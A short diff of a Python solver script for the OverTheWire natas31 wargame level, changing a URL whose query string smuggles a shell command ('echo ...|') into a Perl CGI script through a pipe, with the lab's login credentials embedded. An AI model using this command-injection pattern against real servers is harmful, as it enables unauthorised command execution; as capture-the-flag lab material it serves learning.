@@ -57,5 +57,5 @@ def natas31(url):
     print(response.text)
 
 if __name__ == '__main__':
-    url = 'http://natas31:hay7aecuungiuKaezuathuk9biin0pu1@natas31.natas.labs.overthewire.org/index.pl?echo%20exploited|'
+    url = 'http://natas31:hay7aecuungiuKaezuathuk9biin0pu1@natas31.natas.labs.overthewire.org/index.pl?echo hello|'
     natas31(url)
